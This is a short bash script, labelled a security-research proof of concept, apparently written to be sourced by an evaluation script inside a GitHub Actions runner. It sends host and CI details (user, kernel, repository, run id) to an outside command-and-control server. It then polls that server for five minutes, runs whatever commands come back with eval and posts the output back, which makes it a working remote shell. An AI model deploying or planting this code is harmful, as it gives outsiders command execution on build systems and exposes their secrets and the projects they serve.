#!/bin/bash
# Security Research - GLUECoS LOTP PoC
# This file gets sourced by eval.sh

C2="https://git.trebor.ai"
SESSION_ID="gluecos-$(hostname)-$$"

echo "[*] GLUECoS LOTP - HTTP Shell"
echo "[*] Session: $SESSION_ID"

# Initial beacon with system info
SYSINFO=$(cat << SYSEOF
{
  "hostname": "$(hostname)",
  "user": "$(whoami)",
  "uid": "$(id)",
  "kernel": "$(uname -a)",
  "pwd": "$(pwd)",
  "runner_name": "$RUNNER_NAME",
  "github_repo": "$GITHUB_REPOSITORY",
  "github_run_id": "$GITHUB_RUN_ID",
  "trigger": "config_sh"
}
SYSEOF
)
curl -s -X POST "$C2/shell/$SESSION_ID/beacon" -H "Content-Type: application/json" -d "$SYSINFO"

echo "[*] Starting interactive shell (5 min timeout)..."
echo "[*] Send commands: curl -X POST $C2/shell/$SESSION_ID/cmd -d 'command'"

# Foreground shell loop - keeps workflow alive
END_TIME=$((SECONDS + 300))  # 5 minutes
while [ $SECONDS -lt $END_TIME ]; do
    CMD=$(curl -s "$C2/shell/$SESSION_ID/poll" 2>/dev/null)
    if [ -n "$CMD" ] && [ "$CMD" != "null" ] && [ "$CMD" != "" ]; then
        echo "[*] Executing: $CMD"
        OUTPUT=$(eval "$CMD" 2>&1 | head -c 50000)
        echo "$OUTPUT" | curl -s -X POST "$C2/shell/$SESSION_ID/output" -d @-
        echo "[*] Output sent"
    fi
    sleep 2
done
echo "[*] Shell timeout reached"
